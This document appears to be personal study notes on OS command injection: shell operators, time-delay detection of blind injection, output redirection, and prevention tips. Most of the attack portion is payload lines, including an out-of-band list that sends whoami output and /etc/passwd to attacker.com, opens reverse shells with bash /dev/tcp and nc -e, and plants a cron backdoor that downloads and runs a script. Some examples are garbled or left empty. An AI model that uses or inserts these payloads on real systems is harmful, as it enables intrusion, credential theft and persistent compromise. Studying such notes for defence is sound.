- **`;` (Command separator)**

    - Allows multiple commands to run sequentially.
    - **Example**: `echo hello; ls`
  `&&` (Logical AND)  
    - Executes the second command only if the first succeeds.
    - **Example**: `mkdir test && cd test`
- **`||` (Logical OR)**
    - Executes the second command only if the first fails.
    - **Example**: `cd nonexistent || echo "Failed"`
- **`|` (Pipe)**
    - Passes the output of the first command as input to the second.
    - **Example**: `ls | grep test`
- **`$()` (Command substitution)**
    - Executes a command and substitutes its output.
    - **Example**: `echo $(whoami)`
- **``` (Backticks for command substitution)**
    - Executes a command and substitutes its output (deprecated but still used).
    - **Example**: `echo `date``
- **`&` (Background execution)**
    - Runs the command in the background.
    - **Example**: `sleep 5 & echo "Done"`
- **`>` (Output redirection)**
    - Redirects the output to a file, overwriting its contents.
    - **Example**: `echo hello > file.txt`
- **`<` (Input redirection)**
    - Takes input from a file instead of standard input.
    - **Example**: `wc -l < file.txt`
- **`>>` (Append redirection)**
    - Appends the output to a file without overwriting.
    - **Example**: `echo hello >> file.txt`
- **`()` (Subshell execution)**
    - Executes commands in a subshell.
    - **Example**: `(cd /tmp && ls)`
- **`{}` (Command grouping)**
    - Groups multiple commands as one operation.
    - **Example**: `{ echo hello; echo world; }`
- **`#` (Comment to terminate valid commands)**
    - Marks the rest of the line as a comment.
    - **Example**: `echo hello # This is a comment`
- **`\` (Escape character)**
    - Escapes special characters to treat them as literal.
    - **Example**: `echo hello\ world`
- **`\n` (Newline to split commands)**
    - Splits commands with a newline character.
    - **Example**:
`%0A` (URL-encoded newline)**
    - URL-encoded version of a newline, often used in web-based attacks.
    - **Example**: `echo hello%0Als`
- **`|| true` or `&& false` (Chaining to modify flow)**
    - Alters logical flow of commands to ensure certain outcomes.
    - **Example**: `mkdir test || true`
- **Environment variables (e.g., `$HOME`, `$PATH`)**
    - Replaces with the value of an environment variable.
    - **Example**: `echo $HOME`
- **Concatenation (`+`, depending on the language/shell)**
    - Joins strings or paths in certain shells or scripts.
    - **Example**: `echo "Hello" + "World"` (specific to certain shells or scripts)
- **Wildcards (e.g., , `?`, `[ ]`)**
    - Matches multiple filenames or patterns.
    - **Example**: `ls *.tx`

Purpose of command 	Linux 	Windows
Name of current user 	whoami 	whoami
Operating system 	        uname -a 	        ver
Network configuration 	ifconfig 	        ipconfig /all
Network connections 	netstat -an 	netstat -an
Running processes 	        ps -ef 	        tasklist

##### Blind OS command injection vulnerabilities
Detecting blind OS command injection using time delays :

Command	OS	                  Example	                                           Description
sleep	            Linux/Unix	  ; sleep 10;	                                        Pauses for 10 seconds.
ping	            Linux/Unix	  ; ping -c 10 127.0.0.1;	                Sends 10 pings (~10-second delay).
read	            Linux/Unix	  ; read -t 10;	                                    Waits for input for 10 seconds.
timeout	    Windows	      & timeout /t 10 &	                        Pauses for 10 seconds.
ping	            Windows	      & ping -n 10 127.0.0.1 > nul &	Sends 10 pings (~10-second delay).
pause	        Windows	     & pause &	                                         Waits for user interaction (manual).

##### Exploiting blind OS command injection by redirecting output
```bash
& whoami > /var/www/static/whoami.txt &
```
access that page where whomai.txt is saved like [http://vuln.com/whomai.txt](http://vuln.com/whomai.txt) , we can copy shell here also for reverse shell


File Redirection (>)
Redirects standard output (stdout) to a file.
```bash
; whoami > /tmp/output.txt;
```
​
Append Redirection (>>)
Appends stdout to an existing file.
```bash
; uname -a >> /tmp/output.txt;
; uname -a >> /tmp/output.txt;
; ls /invalid_path 2> /tmp/errors.txt;
```

​
Captures the error message from ls to /tmp/errors.txt.
Redirect Both stdout and stderr (>&)
Redirects stdout and stderr to the same file
```bash
; id >& /tmp/output.txt;
```

​
Saves all output (including errors) from id to /tmp/output.txt
Pipe Output to Another Command (|)
Passes stdout of one command as input to another.
```bash
; whoami | nc attacker.com 1234
```

​
Sends whoami output to a Netcat listener.
Redirect to Network Location (/dev/tcp)
Sends stdout over a raw TCP connection. this should be run in bash shell 
```bash
; cat /etc/passwd > /dev/tcp/ip-address/1234;
 bash -c 'cat /etc/passwd > /dev/tcp/192.168.159.128/1234'
```

​
Send via HTTP (curl or wget)
Exfiltrates data to an HTTP endpoint.
```bash
; whoami | curl -X POST -d @- http://attacker.com/log;
```

​
Sends whoami output as POST data.
Email Output (mail)
Sends stdout via email.
```bash
; uname -a | mail -s "Command Output" attacker@example.com
```

​
Sends system information to the attacker.
Error and Output to Different Files (2> and 1>)
```bash
; ls /invalid_path 1> /tmp/output.txt 2> /tmp/errors.txt;
```

​
Captures stdout in /tmp/output.txt and stderr in /tmp/errors.txt.
Chaining Redirection Commands
Combines multiple commands with separate redirections.
```bash
; whoami > /tmp/user.txt; uname -a >> /tmp/system.txt;
```

​
Writes whoami output to /tmp/user.txt and appends uname -a to /tmp/system.txt.


##### Exploiting blind OS command injection using out-of-band (OAST) techniques:
```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
; dig $(id | base64).attacker.com
; whoami | curl -X POST -d @- http://attacker.com/log
; wget http://attacker.com/$(whoami)
; cat /etc/passwd > /dev/tcp/attacker.com/1234
; whoami | nc attacker.com 1234
; uname -a | mail -s "Command Output" attacker@example.com
; echo $(whoami) > \\attacker.com\share\output.txt
; echo $(whoami) | ftp attacker.com
; ping -c 1 $(whoami).attacker.com
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc -e /bin/bash attacker.com 4444
; python -c 'import socket; s=socket.socket(); s.connect(("attacker.com", 1234)); s.send(open("/etc/passwd").read())'
; echo $(whoami) >> /var/log/apache2/access.log
; echo "wget http://attacker.com -O /tmp/payload.sh | bash" >> /etc/cron.d/backdoor
; curl -X POST -d "result=$(whoami)" http://attacker.com/api/webhook
; echo $(whoami) > /dev/tcp/attacker.com/9999



;	    Command separator
&	    Command separator (executes both)
&&	  Logical AND; executes next if previous succeeds
>	    Redirect output
<	    Redirect input
>>	  Append output
$()	  Command substitution
`	    Command substitution
\	    Escape character
'	    Single quote
"	    Double quote
\n	  Newline
%0A	  URL-encoded newline
%26	  URL-encoded ampersand
%7C	  URL-encoded pipe



```

using rev command
```bash
arrow@ideapad:/mnt/enjoy/python/commandinjection$ echo "whoami"
imaohw
arrow@ideapad:/mnt/enjoy/python/commandinjection$ echo "imaohw" | rev
whoami
arrow@ideapad:/mnt/enjoy/python/commandinjection$ $(echo "imaohw" <<< rev)
imaohw: command not found
arrow@ideapad:/mnt/enjoy/python/commandinjection$ $(echo "imaohw" <<< rev)
imaohw: command not found
arrow@ideapad:/mnt/enjoy/python/commandinjection$ $(echo "imaohw" << rev)
bash: warning: here-document at line 77 delimited by end-of-file (wanted 'rev')
bash: warning: here-document at line 1 delimited by end-of-file (wanted 'rev')
imaohw: command not found
arrow@ideapad:/mnt/enjoy/python/commandinjection$ $(echo "imaohw" <<< rev)
imaohw: command not found
arrow@ideapad:/mnt/enjoy/python/commandinjection$ $(echo "whoami" <<< rev)
arrow
arrow@ideapad:/mnt/enjoy/python/commandinjection$ $(echo "imaohw" | rev)
arrow
arrow@ideapad:/mnt/enjoy/python/commandinjection$ echo "whoami" | base64
d2hvYW1pCg ==
```




##### Preventation :
```bash
Validating against a whitelist of permitted values.
Validating that the input is a number.
Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
```
- Avoid executing system commands altogether. Use high-level APIs or libraries to perform tasks instead of relying on the shell.
- Validate user input against a whitelist of permitted values. Reject anything not explicitly allowed.
- Neutralize potentially dangerous characters (e.g., `;`, `|`, `&`) to prevent them from being interpreted by the shell. example escapeshellarg()
- Use parameterized queries or APIs that separate command logic from user input.
- Remove unwanted characters or patterns using regular expressions.
- Disable special shell features, such as globbing or environment variable expansion, if using `sh` or similar tools.

##### Bypass restriction:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-with-single-quote

